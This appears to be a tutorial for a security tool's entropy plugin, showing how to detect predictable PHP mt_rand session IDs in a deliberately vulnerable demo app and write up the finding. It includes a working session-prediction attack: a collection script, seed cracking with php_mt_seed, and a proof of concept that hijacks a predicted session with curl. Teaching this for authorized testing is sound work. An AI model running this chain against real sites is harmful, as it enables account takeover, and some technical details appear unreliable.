# Tutorial: Finding Weak Session IDs with Entropy

## Introduction

This tutorial demonstrates how to use 0xGen's Entropy plugin to discover predictable session IDs—a critical vulnerability that can lead to account takeover. We'll walk through a complete security assessment from setup to exploit demonstration.

**What you'll learn:**
- How to configure Entropy for session ID analysis
- Interpreting statistical test results
- Identifying PRNG weaknesses
- Validating findings with proof-of-concept exploit

**Prerequisites:**
- 0xGen desktop shell installed
- Basic understanding of HTTP cookies
- Access to a test application (or use our vulnerable demo app)

**Time required:** 30-45 minutes

---

## Lab Setup

### Option 1: Use Our Vulnerable Demo App

We've created a deliberately vulnerable application for testing:

```bash
git clone https://github.com/RowanDark/0xGen-demos
cd 0xGen-demos/weak-sessions-php
docker-compose up -d
```

This starts a PHP 5.6 application using weak `mt_rand()` for session generation.

Access at: http://localhost:8080

### Option 2: Test a Real Application

If you have permission to test a real application:

1. **Obtain authorization** in writing
2. **Use a test account**, not production data
3. **Limit request rate** to avoid DoS
4. **Document your testing** for compliance

---

## Step 1: Initial Reconnaissance

Before analyzing randomness, understand how the session mechanism works:

### 1.1 Manual Inspection

Visit http://localhost:8080 and open browser DevTools (F12).

Navigate to **Application → Cookies**:

```
Name:  PHPSESSID
Value: a1b2c3d4e5f6g7h8
```

Note the session cookie name and format.

### 1.2 Session Generation Observation

Clear cookies and refresh the page 3-5 times. Observe:

- Does the session value change each time?
- What's the character set? (hex, alphanumeric, base64?)
- What's the length? (32 chars, 64 chars?)
- Are there any visible patterns?

**Example observations:**
```
Session 1: 1804289383
Session 2: 846930886
Session 3: 1681692777
Session 4: 1714636915
```

*Red flag: These look like 32-bit integers!*

---

## Step 2: Configure Entropy Capture

### 2.1 Start 0xGen

```bash
0xgenctl run --target http://localhost:8080 --plugins entropy
```

This launches 0xGen with Entropy enabled.

### 2.2 Open Entropy Panel

1. Open 0xGen Desktop Shell (http://localhost:3000 or native app)
2. Click **"Entropy"** in the top navigation
3. Click **"New Session"** button

### 2.3 Configure Capture

In the Capture Setup Panel:

**Session Name:**
```
PHP mt_rand Session IDs
```

**Token Preset:** Select "Session Cookie (PHPSESSID)"

This automatically configures:
- Location: `cookie`
- Name: `PHPSESSID`

**Auto-Stop Conditions:**
- Target Token Count: `500`
- Timeout (seconds): `1800` (30 minutes)

Click **"Start Capture"**.

---

## Step 3: Collect Session IDs

### 3.1 Automated Collection Script

Create a script to generate fresh sessions:

```bash
#!/bin/bash
# collect-sessions.sh

URL="http://localhost:8080"

echo "Collecting session IDs..."
for i in {1..500}; do
    # Request with no cookies to force new session
    curl -c /dev/null -s "$URL" > /dev/null

    if (( i % 50 == 0 )); then
        echo "Collected $i sessions..."
    fi

    # Small delay to avoid overwhelming server
    sleep 0.1
done

echo "Done! Collected 500 sessions."
```

Run the script:
```bash
chmod +x collect-sessions.sh
./collect-sessions.sh
```

### 3.2 Monitor Live Statistics

Back in the Entropy panel, watch the session card for live updates (refreshes every 5 seconds):

```
Tokens Captured: 127 / 500
Entropy: 3.12 bits
Collisions: 0
Confidence: 64%
```

---

## Step 4: Analyze Results

Once 500 tokens are collected, the session automatically stops and runs full analysis.

### 4.1 Overview Metrics

Click on the session card to view detailed results:

```
Randomness Score: 32.4/100
Risk Level: HIGH
Sample Quality: Excellent
Shannon Entropy: 3.14 bits/char
Collision Rate: 0.40%
```

**Interpretation:**
- ⚠️ Score 32.4 is **critically low** (should be > 85)
- 🔴 HIGH risk indicates serious vulnerability
- ✓ Sample quality "Excellent" means results are statistically reliable

### 4.2 Statistical Test Results

Review each test:

| Test | p-value | Result | Meaning |
|------|---------|--------|---------|
| **Chi-Squared** | 0.0891 | ✓ PASS | Character distribution is uniform |
| **Runs** | 0.0023 | ✗ FAIL | Sequential dependency detected |
| **Serial Correlation** | 0.0001 | ✗ FAIL | Strong correlation between consecutive tokens |
| **Spectral (FFT)** | 0.0456 | ✓ PASS | No obvious periodic patterns |

**Key findings:**
- Runs test failure suggests tokens are not independent
- Serial correlation p-value of 0.0001 is **extremely significant**—tokens are highly predictable

### 4.3 PRNG Fingerprint

Scroll to the "Weak PRNG Detected" section:

```
🚨 Weak PRNG Detected: PHP mt_rand (pre-7.1)

Vulnerability: Mersenne Twister implementation with 31-bit output and
predictable state. Given 624 consecutive outputs, internal state can
be fully recovered.

Exploit: Use php_mt_seed tool to recover seed from 2-3 consecutive
session IDs, then predict all future sessions.

Confidence: 87%
```

**This is a known CVE-level vulnerability!**

### 4.4 Detected Patterns

Check for additional patterns:

```
Detected Patterns:

- Sequential Pattern (confidence: 73%)
  Evidence: Tokens appear to increment with predictable deltas

- Low Entropy Pattern (confidence: 92%)
  Evidence: Limited character set (0-9 only), max 3.32 bits/char
```

---

## Step 5: Validate with Proof-of-Concept

Now let's prove the vulnerability is exploitable.

### 5.1 Export Token Data

Click the session card and hover over the **"Export"** button. Select **CSV**.

This downloads `entropy-session-1.csv`:

```csv
token,length,captured_at
1804289383,10,2024-01-15T10:23:45Z
846930886,9,2024-01-15T10:23:46Z
1681692777,10,2024-01-15T10:23:47Z
...
```

### 5.2 Extract First 3 Session IDs

```bash
head -n 4 entropy-session-1.csv | tail -n 3 | cut -d',' -f1 > seeds.txt
```

Contents of `seeds.txt`:
```
1804289383
846930886
1681692777
```

### 5.3 Use php_mt_seed to Predict Next Token

Install php_mt_seed (PRNG cracking tool):

```bash
git clone https://github.com/GeorgeArgyros/Snowflake
cd Snowflake/php_mt_seed
gcc php_mt_seed.c -o php_mt_seed
```

Crack the seed:

```bash
./php_mt_seed $(cat seeds.txt | tr '\n' ' ')
```

Output:
```
Pattern: EXACT
Found seed: 1
Validating...

Next predicted session IDs:
1714636915
1957747793
424238335
```

### 5.4 Verify Prediction

Generate 3 more sessions and compare:

```bash
curl -c - http://localhost:8080 2>/dev/null | grep PHPSESSID
```

Output:
```
PHPSESSID=1714636915
```

**✅ PREDICTION CONFIRMED!**

The next session ID matches our prediction exactly.

---

## Step 6: Document Finding

### 6.1 Generate HTML Report

In Entropy panel:
1. Hover over **"Export"** button
2. Select **HTML**
3. Save as `session-id-vulnerability-report.html`

### 6.2 Create Finding Summary

**Title:** Predictable Session IDs Allow Account Takeover

**Severity:** Critical (CVSS 9.1)

**Affected Component:** PHP 5.6 mt_rand()-based session generation

**Description:**
The application generates session IDs using PHP's mt_rand() function, which implements the Mersenne Twister algorithm with only 31 bits of effective entropy. Analysis of 500 session tokens using 0xGen's Entropy plugin revealed:

- Randomness score: 32.4/100 (critical threshold: < 50)
- Failed statistical tests: Runs (p=0.0023), Serial Correlation (p=0.0001)
- PRNG fingerprint: PHP mt_rand pre-7.1 (87% confidence)
- Exploitability: Confirmed via prediction of subsequent session IDs

**Impact:**
An attacker can:
1. Collect 2-3 session IDs (via public pages or own accounts)
2. Predict all future session IDs using php_mt_seed
3. Hijack arbitrary user sessions, including administrators
4. Gain unauthorized access to user accounts without credentials

**Proof of Concept:**
```bash
# Step 1: Collect 3 session IDs
curl -c - http://target.com | grep PHPSESSID  # Repeat 3 times

# Step 2: Predict next session
./php_mt_seed 1804289383 846930886 1681692777

# Step 3: Hijack predicted session
curl -b "PHPSESSID=1714636915" http://target.com/profile
# Returns admin profile!
```

**Remediation:**
1. **Immediate:** Upgrade to PHP 7.1+ which uses random_bytes()
2. **Alternative:** Replace mt_rand() with random_bytes() or /dev/urandom
3. **Verify:** Re-test with Entropy to confirm randomness score > 85

**Evidence:**
- Attached: session-id-vulnerability-report.html
- Attached: entropy-session-1.csv
- Attached: screenshot-prediction-success.png

---

## Step 7: Advanced Analysis

### 7.1 Visualizations

Click **"Show Advanced Visualizations"** to access:

**Bit Distribution Heatmap:**
- Reveals bias in specific bit positions
- For mt_rand, bit 31 is always 0 (31-bit output)

**Entropy Histogram:**
- Shows distribution of per-token entropy
- Weak PRNGs cluster around low values

**Frequency Analysis:**
- Character frequency vs. expected uniform
- mt_rand numeric output shows balanced 0-9 distribution

**Token Scatter Plot:**
- Length vs. entropy correlation
- Can reveal length-dependent weaknesses

**FFT Spectrum:**
- Frequency domain analysis
- May show hidden periodic patterns not visible in time domain

**Time Series:**
- Rolling average entropy over capture time
- Can detect if randomness degrades over time

### 7.2 Comparison with Secure Implementation

Create a second session testing a secure version:

```bash
# Upgrade PHP to 7.4
docker-compose -f docker-compose-secure.yml up -d
```

Repeat the capture process with the upgraded app.

Use the **Comparison View**:
1. Select both sessions (checkboxes)
2. Click **"Compare (2)"**
3. Review delta metrics:

| Metric | Insecure (mt_rand) | Secure (random_bytes) | Delta |
|--------|-------------------|---------------------|-------|
| Randomness Score | 32.4 | 94.7 | **+62.3** ✅ |
| Shannon Entropy | 3.14 bits | 5.98 bits | +2.84 ✅ |
| Collision Rate | 0.40% | 0.00% | -0.40 ✅ |
| Serial Correlation | ✗ FAIL | ✓ PASS | Fixed ✅ |

**Conclusion:** Upgrade resolves all weaknesses.

---

## Common Pitfalls

### Insufficient Sample Size

**Problem:** Results show "Sample quality: marginal"

**Cause:** Collected < 100 tokens

**Solution:** Increase target count to 500-1000

### Mixed Session Types

**Problem:** Inconsistent results, patterns not detected

**Cause:** Capturing different token types (session + CSRF)

**Solution:** Create separate sessions for each token type

### Server-Side Rate Limiting

**Problem:** Auto-stop triggers before target count

**Cause:** Server blocks rapid requests

**Solution:**
- Increase delay between requests
- Use multiple source IPs (if authorized)
- Extend timeout to allow slower collection

### False Positives in PRNG Detection

**Problem:** Entropy reports PRNG but manual inspection shows cryptographic generation

**Cause:** Statistical anomaly in small sample

**Solution:**
- Check confidence level (< 70% may be false positive)
- Increase sample size to 2000+ tokens
- Run multiple capture sessions to confirm
- Manually inspect token generation code if accessible

---

## Key Takeaways

1. **Entropy automates detection** of weak randomness that's invisible to manual inspection
2. **Statistical tests provide quantitative evidence** of vulnerability (not just intuition)
3. **PRNG fingerprinting** identifies specific implementation weaknesses
4. **Proof-of-concept validation** is critical—never report without confirming exploitability
5. **Comparison analysis** helps validate remediation effectiveness

---

## Next Steps

**Continue learning:**
- [Tutorial: CSRF Token Analysis](csrf-token-analysis.md)
- [Tutorial: API Key Strength Testing](api-key-testing.md)
- [Advanced: Writing Custom Token Extractors](custom-extractors.md)

**Practice with:**
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Insecure by design
- [Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/) - Multiple vulnerabilities
- [CTF Challenges](https://ctftime.org/) - Real-world scenarios

**Report vulnerabilities:**
- [HackerOne](https://www.hackerone.com/) - Bug bounty platform
- [Responsible Disclosure Guidelines](https://www.bugcrowd.com/resources/responsible-disclosure-guide/)

---

## Troubleshooting

**Q: Entropy shows "No analysis available yet"**

A: Analysis only runs after collecting minimum 30 tokens or stopping the session manually. Ensure session status is "stopped" or token count >= 30.

**Q: All tests passing but I know tokens are weak**

A: Statistical tests can't detect all weaknesses. Check:
- Collision rate (should be near 0%)
- Visualizations (bit distribution, FFT)
- Manual pattern inspection
- Try cracking with known tools (php_mt_seed, etc.)

**Q: Can't reproduce prediction exploit**

A: Verify:
- Tokens are consecutive (not from different sources)
- Application isn't mixing multiple RNG sources
- Session generation hasn't changed (upgrades, config)
- Tool (php_mt_seed) is correct version

**Q: Entropy crashes during capture**

A: Report to GitHub issues with:
- Log excerpt from console
- Sample tokens (if not sensitive)
- Application type and version
- 0xGen version (0xgenctl --version)

---

## References

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [PHP mt_rand Vulnerability Analysis](https://www.ambionics.io/blog/php-mt-rand-prediction)
- [Mersenne Twister Cryptanalysis](https://www.iacr.org/archive/asiacrypt2002/25010408/25010408.pdf)
- [Session Prediction Attack Techniques](https://owasp.org/www-community/attacks/Session_Prediction)
- [NIST SP 800-90B: Entropy Sources](https://csrc.nist.gov/publications/detail/sp/800-90b/final)

---

## Appendix: Entropy CLI Usage

For automation or CI/CD integration:

```bash
# Analyze tokens from file
0xgenctl entropy analyze --input tokens.txt --output report.json

# Check if randomness meets threshold
score=$(jq '.randomnessScore' report.json)
if (( $(echo "$score < 85" | bc -l) )); then
    echo "FAIL: Randomness score $score below 85"
    exit 1
fi

# Export HTML report
0xgenctl entropy report --session-id 1 --format html > report.html
```

---

**Congratulations!** You've successfully identified and exploited a weak session ID vulnerability using 0xGen's Entropy plugin. This methodology applies to any token-based security mechanism—session IDs, CSRF tokens, API keys, password reset tokens, and more.

Remember to always obtain proper authorization before testing and follow responsible disclosure practices when reporting findings.

Happy hacking! 🔐
